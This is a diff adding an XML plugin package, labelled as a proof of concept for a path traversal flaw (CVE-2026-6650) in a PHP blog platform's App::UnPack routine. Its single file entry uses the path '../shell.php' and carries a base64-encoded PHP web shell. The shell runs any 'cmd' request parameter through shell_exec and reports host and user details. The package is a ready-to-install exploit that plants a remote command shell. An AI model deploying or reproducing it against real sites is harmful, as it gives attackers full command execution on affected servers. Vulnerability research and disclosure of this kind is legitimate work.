@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8"?>
+<app version="php" type="plugin">
+  <id>evil_poc</id>
+  <name>Evil PoC</name>
+  <url>http://poc.local/</url>
+  <note>CVE-2026-6650 Path Traversal PoC</note>
+  <description>Path traversal via single ../ in App::UnPack</description>
+  <path></path>
+  <include></include>
+  <level></level>
+  <author><name>Researcher</name><email>poc@test.local</email><url>http://poc.local/</url></author>
+  <source><name>PoC</name><email></email><url></url></source>
+  <adapted>1.7</adapted>
+  <version>1.0</version>
+  <pubdate>2026-06-14</pubdate>
+  <modified>2026-06-14</modified>
+  <price>0</price>
+  <phpver>5.4</phpver>
+  <advanced><dependency></dependency><rewritefunctions></rewritefunctions><existsfunctions></existsfunctions><conflict></conflict></advanced>
+  <sidebars><sidebar1></sidebar1><sidebar2></sidebar2><sidebar3></sidebar3><sidebar4></sidebar4><sidebar5></sidebar5><sidebar6></sidebar6><sidebar7></sidebar7><sidebar8></sidebar8><sidebar9></sidebar9></sidebars>
+  <folder><path>evil_poc</path></folder>
+  <file>
+    <path>../shell.php</path>
+    <stream>PD9waHAKLyoqCiAqIFotQmxvZ1BIUCBBcHA6OlVuUGFjayBQYXRoIFRyYXZlcnNhbCBQb0MKICogQ1ZFLTIwMjYtNjY1MCB8IFZlcmlmaWVkIG9uIFotQmxvZ1BIUCAxLjcuNQogKiBXcml0dGVuIHRvOiB6Yl91c2Vycy9zaGVsbC5waHAgdmlhIHNpbmdsZSAuLi8gdHJhdmVyc2FsCiAqLwoKJGNtZCA9ICRfR0VUWydjbWQnXSA/PyAkX1BPU1RbJ2NtZCddID8/ICcnOwppZiAoJGNtZCkgewogICAgZWNobyAiPHByZT4iOwogICAgZWNobyAiWystLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rXQoiOwogICAgZWNobyAifCBaLUJsb2dQSFAgQXBwOjpVblBhY2sgUGF0aCBUcmF2ZXJzYWwgIHwKIjsKICAgIGVjaG8gInwgQ1ZFLTIwMjYtNjY1MCBFeHBsb2l0IFZlcmlmaWVkICAgICAgICB8CiI7CiAgICBlY2hvICJbKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLStdCiI7CiAgICBlY2hvICJ8IEhvc3RuYW1lOiAiIC4gcGhwX3VuYW1lKCduJykgLiAiCiI7CiAgICBlY2hvICJ8IFVzZXI6ICIgLiBnZXRfY3VycmVudF91c2VyKCkgLiAiCiI7CiAgICBlY2hvICJ8IFBIUDogIiAuIFBIUF9WRVJTSU9OIC4gIgoiOwogICAgZWNobyAifCBEaXI6ICIgLiBfX0RJUl9fIC4gIgoiOwogICAgZWNobyAiWystLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rXQoiOwogICAgZWNobyAifCBDT01NQU5EIE9VVFBVVDoKIjsKICAgIGVjaG8gInwgIiAuIHNoZWxsX2V4ZWMoJGNtZCk7CiAgICBlY2hvICI8L3ByZT4iOwp9IGVsc2UgewogICAgZWNobyAiQXBwOjpVblBhY2sgUGF0aCBUcmF2ZXJzYWwgUG9DIC0gU2VuZCA/Y21kPWlkIjsKfQo=</stream>
+  </file>
+</app>
